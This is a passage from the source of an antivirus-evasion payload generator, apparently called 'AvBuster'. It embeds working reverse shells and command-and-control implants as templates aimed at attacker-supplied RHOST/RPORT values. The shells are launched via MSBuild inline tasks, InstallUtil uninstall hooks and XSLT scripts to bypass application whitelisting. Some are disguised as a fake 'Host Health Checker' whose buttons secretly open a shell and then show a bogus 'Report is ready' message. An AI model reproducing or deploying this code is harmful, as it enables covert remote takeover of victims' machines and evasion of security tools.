                            Process p = new Process();
                            p.StartInfo.FileName = ""cmd.exe"";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }

        }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>";
            string msbuildpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";

            using (StreamWriter sw = new StreamWriter(@"C:\Windows\Temp\tdu.xml"))
            {
                sw.Write(buildval);
            }
            Process p = new Process();
            p.StartInfo.FileName = msbuildpath;
            p.StartInfo.Arguments = @"C:\Windows\Temp\tdu.xml";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.Verb = "runas";
            p.Start();
            p.WaitForExit();

        }

        private void button1_Click(object sender, EventArgs e)
        {
            //createpsrevshell();
            this.Close();
        }

        private void btnUpdateCheck_Click(object sender, EventArgs e)
        {
            updatemsbuild();
            System.Threading.Thread.Sleep(4000);
            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Red;

        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Gray;

        }

        private void InitializeComponent()
        {
            this.headerpanel = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.missinglabel = new System.Windows.Forms.Label();
            this.btnHealthCheck = new System.Windows.Forms.Button();
            this.btnCPUUsage = new System.Windows.Forms.Button();
            this.btnUpdateCheck = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.headerpanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // headerpanel
            // 
            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
            this.headerpanel.Controls.Add(this.button1);
            this.headerpanel.Controls.Add(this.missinglabel);
            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.headerpanel.Location = new System.Drawing.Point(0, 0);
            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
            this.headerpanel.Name = "headerpanel";
            this.headerpanel.Size = new System.Drawing.Size(460, 30);
            this.headerpanel.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.button1.Location = new System.Drawing.Point(423, 1);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(36, 27);
            this.button1.TabIndex = 4;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
            // 
            // missinglabel
            // 
            this.missinglabel.AutoSize = true;
            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.missinglabel.Location = new System.Drawing.Point(127, 9);
            this.missinglabel.Name = "missinglabel";
            this.missinglabel.Size = new System.Drawing.Size(193, 15);
            this.missinglabel.TabIndex = 0;
            this.missinglabel.Text = "Multi Purpose Host Health Checker";
            // 
            // btnHealthCheck
            // 
            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
            this.btnHealthCheck.Name = "btnHealthCheck";
            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
            this.btnHealthCheck.TabIndex = 2;
            this.btnHealthCheck.Text = "Health Check";
            this.btnHealthCheck.UseVisualStyleBackColor = true;
            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnCPUUsage
            // 
            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
            this.btnCPUUsage.Name = "btnCPUUsage";
            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
            this.btnCPUUsage.TabIndex = 1;
            this.btnCPUUsage.Text = "CPU Usage";
            this.btnCPUUsage.UseVisualStyleBackColor = true;
            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnUpdateCheck
            // 
            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
            this.btnUpdateCheck.Name = "btnUpdateCheck";
            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
            this.btnUpdateCheck.TabIndex = 0;
            this.btnUpdateCheck.Text = "Check Updates";
            this.btnUpdateCheck.UseVisualStyleBackColor = true;
            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // button3
            // 
            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.Location = new System.Drawing.Point(241, 133);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(180, 56);
            this.button3.TabIndex = 3;
            this.button3.Text = "Hidden Files";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // Form
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(460, 222);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.btnUpdateCheck);
            this.Controls.Add(this.btnCPUUsage);
            this.Controls.Add(this.btnHealthCheck);
            this.Controls.Add(this.headerpanel);
            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(460, 250);
            this.MinimizeBox = false;
            this.Name = "Form";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Health Checker";
            this.headerpanel.ResumeLayout(false);
            this.headerpanel.PerformLayout();
            this.ResumeLayout(false);

        }

    }
`
var AvBusterInstallShieldTCPReverseShell = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var instutil, cscpath, instutilpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "RHOST"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "RPORT"

func init() {
	instutil = RPLusing System;
	using System.ComponentModel;
	using System.Configuration.Install;
	using System.Diagnostics;
	using System.IO;
	using System.Net.Sockets;
	using System.Text;
	
	namespace Instutil
	{
		public class Program
		{
	
			public static void Main()
			{
				Console.WriteLine("Does not have any role here");
				//Add any behaviour here to throw off sandbox execution/analysts :)
	
			}
		}
	
		[RunInstaller(true)]
		public partial class ProjectInstaller : Installer
		{
			StreamWriter streamWriter;
	
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Console.WriteLine("The Uninstall method of 'RevShellInsaller' has been called");
				revconnect();
			}
	
			private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
			{
				StringBuilder strOutput = new StringBuilder();
	
				if (!String.IsNullOrEmpty(outLine.Data))
				{
					try
					{
						strOutput.Append(outLine.Data);
						streamWriter.WriteLine(strOutput);
						streamWriter.Flush();
					}
					catch (Exception) { }
				}
			}
			public void revconnect()
			{
				try
				{
					using (TcpClient client = new TcpClient("IPHERE", PORTHERE))
					{
						using (Stream stream = client.GetStream())
						{
							using (StreamReader rdr = new StreamReader(stream))
							{
								streamWriter = new StreamWriter(stream);
	
								StringBuilder strInput = new StringBuilder();
	
								Process p = new Process();
								p.StartInfo.FileName = "cmd.exe";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();
	
								while (true)
								{
									strInput.Append(rdr.ReadLine());
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
				}
				catch (Exception)
				{
	
	
				}
			}
		}
	}
	RPL
	cscpath = RPLC:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exeRPL
	instutilpath = RPLC:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exeRPL
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createinstlutiltemplate(MANAGERIP, REMOTEPORT)
	buildpath := filepath.FromSlash(RPLC:\Windows\temp\build.batRPL)
	buildbat, err := os.Create(buildpath)
	checkerr(err)
	//fmt.Println(buildpath)
	buildbat.WriteString(cscpath + " " + RPL/out:C:\Windows\temp\instut.exeRPL + " " + RPLC:\Windows\temp\insutil.csRPL)
	buildbat.Close()
	err = exec.Command(buildpath).Run()
	checkerr(err)
	runinstutilpath := filepath.FromSlash(RPLC:\Windows\temp\runinstutil.batRPL)
	runinst, err := os.Create(runinstutilpath)
	checkerr(err)
	//fmt.Println(runinstutilpath)
	runinst.WriteString(instutilpath + RPL /logfile= /LogToConsole=false /U C:\Windows\temp\instut.exeRPL)
	runinst.Close()
	err = exec.Command(runinstutilpath).Run()
	checkerr(err)
	os.Remove(buildpath)
	os.Remove(runinstutilpath)
	os.Remove(RPLC:\Windows\temp\insutil.csRPL)
}

func createinstlutiltemplate(ip, port string) {
	ipreplaced := strings.Replace(instutil, "IPHERE", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORTHERE", port, 1)
	foinstlutil, err := os.Create(RPLC:\Windows\temp\insutil.csRPL)

	checkerr(err)
	foinstlutil.WriteString(portreplaced)
	foinstlutil.Close()

}`

var AvBusterSelfSignedHttps = `package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	//var osshellargs []string
	//fmt.Println("Got a avbuster from ...")
	avbusterserver := "https://REVIPPORT"

	trp := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: trp}

	for {

		response, err := client.Get(avbusterserver)
		checkerr(err)
		defer response.Body.Close()
		//cnt2, _ := ioutil.ReadAll(response.Body)
		//fmt.Println(string(cnt2))

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find("form input").Attr("value")

		if strings.TrimSpace(cnt) == "" {
			cnt = "ipconfig"
		}
		command := strings.TrimSpace(string(cnt))
		//fmt.Println("Go query")
		//fmt.Println(command)

		if command == "bye" {
			client.PostForm(avbusterserver, url.Values{"cmd": {command}, "cmdres": {"avbuster leaves :("}})
			os.Exit(0)
		} else {
			osshellargs := []string{"/C", command}
			if runtime.GOOS == "windows" {
				osshell = "cmd"
			} else {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			/*if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			out, _ := execcmd.Output()
			//fmt.Println(string(out))
			client.PostForm(avbusterserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
			//client.PostForm(avbusterserver, url.Values{"cmd": {command}})
			time.Sleep(3 * time.Second)
		}

	}

}
`
var AvBusterSelfSignedHttpsManager = `package main

import (
	"bufio"
	"fmt"
	"html/template"
	"net/http"
	"os"

	"github.com/fatih/color"
)

//REVPRT set server port here
const PORT = ":REVPRT"

var owntemplate string

type avbusterCommand struct {
	Command    string
	Commandres string
}

var avbustercommandtopost avbusterCommand
var avbustertemplate *template.Template

func init() {
	owntemplate = RPL<!DOCTYPE html>
	<html>
	<body>
	<form action="" method="post" id="cmdform" name="cmdform">
		<input type="text" class="form-control" name="cmd" id="cmd" value= {{.Command}}>
	</form>
	</body>
	</html>RPL

}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	templategeneration()
	avbustercommandtopost = avbusterCommand{}
	avbustertemplate = template.Must(template.ParseFiles("owntemplate.html"))
	http.HandleFunc("/", index)
	err := http.ListenAndServeTLS(PORT, "server.crt", "server.key", nil)
	checkerr(err)
}

func templategeneration() {
	if !fileexists("owntemplate.html") {
		templatefile, err := os.Create("owntemplate.html")
		if err != nil {
			fmt.Println(err)
		}
		templatefile.WriteString(owntemplate)
		templatefile.Close()
	}
}
func fileexists(fname string) bool {
	_, err := os.Stat(fname)
	var exists bool
	if err == nil {
		exists = true
	} else if os.IsNotExist(err) {
		exists = false
	}
	return exists
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	//cyanc := color.New(color.FgCyan, color.Bold)
	if req.Method == "POST" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get("cmdres")
		avbustercommandtopost.Commandres = cmdres
		redc.Println("Message from AVBUSTER TUNNEL...")
		greenc.Println(avbustercommandtopost.Commandres)
		err = avbustertemplate.Execute(respwrt, avbustercommandtopost)
		checkerr(err)

		//content, _ := ioutil.ReadAll(req.Body)
		//fmt.Println(string(content))
	} else {
		redc.Printf("[AvBuster")
		greenc.Printf("HTTPS")
		redc.Printf("Tunnel]~# :")

		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		//cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to avbuster.")
		avbustercommandtopost.Command = cmdtopost
		err := avbustertemplate.Execute(respwrt, avbustercommandtopost)
		checkerr(err)
	}
}
`
var AvBusterInlinerConsoleRevShell = `using System;
using System.IO;
using System.Text;
using System.Xml;
using System.Xml.XPath;
using System.Xml.Xsl;

namespace Inliner
{
    class Program
    {
        private static string strxslfile = @"<xsl:stylesheet version=""2.0""
                xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""
                xmlns:msxsl=""urn:schemas-microsoft-com:xslt""
                xmlns:xslCSharp=""urn:BypassTest"">
    <msxsl:script implements-prefix='xslCSharp' language='Csharp'>
        <msxsl:using namespace=""System.Net.Sockets"" />
        <msxsl:using namespace=""System.IO""/>
        <msxsl:using namespace=""System.Diagnostics""/>
        public static StreamWriter streamWriter;
            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception ex) { throw ex; }
                }
            }
            public void Execute()
            {
                using (TcpClient client = new TcpClient(""RHOST"", RPORT))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = ""cmd.exe"";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
  </msxsl:script>
  <xsl:template match=""success"" >
    <result>
      <xsl:value-of select=""xslCSharp:Execute()"" /> 
     </result> 
   </xsl:template>
</xsl:stylesheet>";

        private static string inlinerxmlpath = @"C:\Windows\Temp\inliner.xml";
        private static string inlinerxslpath = @"C:\Windows\Temp\RunFromHere.xsl";
        static void createxsl()
        {
           File.WriteAllText(inlinerxslpath, strxslfile, Encoding.UTF8);
        }

        static void createxml()
        {
            XmlTextWriter inlinerdata = new XmlTextWriter(inlinerxmlpath, Encoding.UTF8);
            inlinerdata.WriteStartDocument(true);
            inlinerdata.Formatting = Formatting.Indented;
            inlinerdata.WriteStartElement("success");
            inlinerdata.WriteEndElement();
            inlinerdata.WriteEndDocument();
            inlinerdata.Close();
        }

        static void inlinerexecute()
        {
            XsltSettings oxsltsettings = new XsltSettings(false, true);
            XmlUrlResolver oResolver = new XmlUrlResolver();

            XslCompiledTransform oxsl = new XslCompiledTransform();
            oxsl.Load(inlinerxslpath, oxsltsettings, oResolver);

            //Load the XML data file.
            XPathDocument doc = new XPathDocument(inlinerxmlpath);

            //Create an XmlTextWriter to output to the console.             
            XmlTextWriter writer = new XmlTextWriter(Console.Out);
            writer.Formatting = Formatting.Indented;

            //Transform the file.
            oxsl.Transform(doc, writer);
            writer.Close();
        }

        static void Main(string[] args)
        {
            createxml();
            createxsl();
            inlinerexecute();
        }
    }
}`

var AvBusterInlinerGUIRevShell = `using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Xml;
using System.Xml.XPath;
using System.Xml.Xsl;

    public class psForm : System.Windows.Forms.Form
    {
        private System.Windows.Forms.Panel headerpanel;
        private System.Windows.Forms.Label missinglabel;
        private System.Windows.Forms.Button btnHealthCheck;
        private System.Windows.Forms.Button btnCPUUsage;
        private System.Windows.Forms.Button btnUpdateCheck;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Button button1;
        public psForm()
        {
            InitializeComponent();
        }
        
       public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new psForm());
        }
    
        private static string strxslfile = @"<xsl:stylesheet version=""2.0""
        xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""
        xmlns:msxsl=""urn:schemas-microsoft-com:xslt""
        xmlns:xslCSharp=""urn:BypassTest"">
<msxsl:script implements-prefix='xslCSharp' language='Csharp'>
<msxsl:using namespace=""System.Net.Sockets"" />
<msxsl:using namespace=""System.IO""/>
<msxsl:using namespace=""System.Diagnostics""/>
public static StreamWriter streamWriter;
    public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();
        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception ex) { throw ex; }
        }
    }
    public void Execute()
    {
        using (TcpClient client = new TcpClient(""RHOST"", RPORT))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    streamWriter = new StreamWriter(stream);
                    StringBuilder strInput = new StringBuilder();
                    Process p = new Process();
                    p.StartInfo.FileName = ""cmd.exe"";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();
                    while (true)
                    {
                        strInput.Append(rdr.ReadLine());
                        p.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                }
            }
        }
    }
</msxsl:script>
<xsl:template match=""success"" >
<result>
<xsl:value-of select=""xslCSharp:Execute()"" /> 
</result> 
</xsl:template>
</xsl:stylesheet>";

private static string inlinerxmlpath = @"C:\Windows\Temp\inliner.xml";
private static string inlinerxslpath = @"C:\Windows\Temp\RunFromHere.xsl";
static void createxsl()
{
   File.WriteAllText(inlinerxslpath, strxslfile, Encoding.UTF8);
}

static void createxml()
{
    XmlTextWriter inlinerdata = new XmlTextWriter(inlinerxmlpath, Encoding.UTF8);
    inlinerdata.WriteStartDocument(true);
    inlinerdata.Formatting = Formatting.Indented;
    inlinerdata.WriteStartElement("success");
    inlinerdata.WriteEndElement();
    inlinerdata.WriteEndDocument();
    inlinerdata.Close();
}

static void inlinerexecute()
{
    XsltSettings oxsltsettings = new XsltSettings(false, true);
    XmlUrlResolver oResolver = new XmlUrlResolver();

    XslCompiledTransform oxsl = new XslCompiledTransform();
    oxsl.Load(inlinerxslpath, oxsltsettings, oResolver);

    //Load the XML data file.
    XPathDocument doc = new XPathDocument(inlinerxmlpath);

    //Create an XmlTextWriter to output to the console.             
    XmlTextWriter writer = new XmlTextWriter(Console.Out);
    writer.Formatting = Formatting.Indented;

    //Transform the file.
    oxsl.Transform(doc, writer);
    writer.Close();
}


        private void button1_Click(object sender, EventArgs e)
        {
            //createpsrevshell();
            this.Close();
        }

        private void btnUpdateCheck_Click(object sender, EventArgs e)
        {
            createxml();
            createxsl();
            inlinerexecute();
            System.Threading.Thread.Sleep(4000);
            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Red;

        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Gray;

        }

        private void InitializeComponent()
        {
            this.headerpanel = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.missinglabel = new System.Windows.Forms.Label();
            this.btnHealthCheck = new System.Windows.Forms.Button();
            this.btnCPUUsage = new System.Windows.Forms.Button();
            this.btnUpdateCheck = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.headerpanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // headerpanel
            // 
            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
            this.headerpanel.Controls.Add(this.button1);
            this.headerpanel.Controls.Add(this.missinglabel);
            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.headerpanel.Location = new System.Drawing.Point(0, 0);
            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
            this.headerpanel.Name = "headerpanel";
            this.headerpanel.Size = new System.Drawing.Size(460, 30);
            this.headerpanel.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.button1.Location = new System.Drawing.Point(423, 1);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(36, 27);
            this.button1.TabIndex = 4;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
            // 
            // missinglabel
            // 
            this.missinglabel.AutoSize = true;
            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.missinglabel.Location = new System.Drawing.Point(127, 9);
            this.missinglabel.Name = "missinglabel";
            this.missinglabel.Size = new System.Drawing.Size(193, 15);
            this.missinglabel.TabIndex = 0;
            this.missinglabel.Text = "Multi Purpose Host Health Checker";
            // 
            // btnHealthCheck
            // 
            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
            this.btnHealthCheck.Name = "btnHealthCheck";
            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
            this.btnHealthCheck.TabIndex = 2;
            this.btnHealthCheck.Text = "Health Check";
            this.btnHealthCheck.UseVisualStyleBackColor = true;
            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnCPUUsage
            // 
            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
            this.btnCPUUsage.Name = "btnCPUUsage";
            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
            this.btnCPUUsage.TabIndex = 1;
            this.btnCPUUsage.Text = "CPU Usage";
            this.btnCPUUsage.UseVisualStyleBackColor = true;
            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnUpdateCheck
            // 
            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
            this.btnUpdateCheck.Name = "btnUpdateCheck";
            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
            this.btnUpdateCheck.TabIndex = 0;
            this.btnUpdateCheck.Text = "Check Updates";
            this.btnUpdateCheck.UseVisualStyleBackColor = true;
            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // button3
            // 
            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.Location = new System.Drawing.Point(241, 133);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(180, 56);
            this.button3.TabIndex = 3;
            this.button3.Text = "Hidden Files";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // Form
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(460, 222);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.btnUpdateCheck);
            this.Controls.Add(this.btnCPUUsage);
            this.Controls.Add(this.btnHealthCheck);
            this.Controls.Add(this.headerpanel);
            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(460, 250);
            this.MinimizeBox = false;
            this.Name = "Form";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Health Checker";
            this.headerpanel.ResumeLayout(false);
            this.headerpanel.PerformLayout();
            this.ResumeLayout(false);

        }

	}`

var AvBusterPSCsharpRevShellConsole = `using System;
	using System.Management.Automation;
	
	namespace PSCsharp
	{
		class Program
		{ 
			private static void RunPS()
			{
				string script = @"function cleanup {
	if ($client.Connected -eq $true) {$client.Close()}
	if ($process.ExitCode -ne $null) {$process.Close()}
	exit}
	$address = 'RHOST' 
	$port = 'RPORT'
	$client = New-Object system.net.sockets.tcpclient
	$client.connect($address,$port)
	$stream = $client.GetStream()
	$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
	$process = New-Object System.Diagnostics.Process
	$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
	$process.StartInfo.RedirectStandardInput = 1
	$process.StartInfo.RedirectStandardOutput = 1
	$process.StartInfo.UseShellExecute = 0
	$process.StartInfo.WindowStyle = Hidden
	$process.Start()
	$inputstream = $process.StandardInput
	$outputstream = $process.StandardOutput
	Start-Sleep 1
	$encoding = new-object System.Text.AsciiEncoding
	while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
	$stream.Write($encoding.GetBytes($out),0,$out.Length)
	$out = $null; $done = $false; $testing = 0;
	while (-not $done) {
	if ($client.Connected -ne $true) {cleanup}
	$pos = 0; $i = 1
	while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
	$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
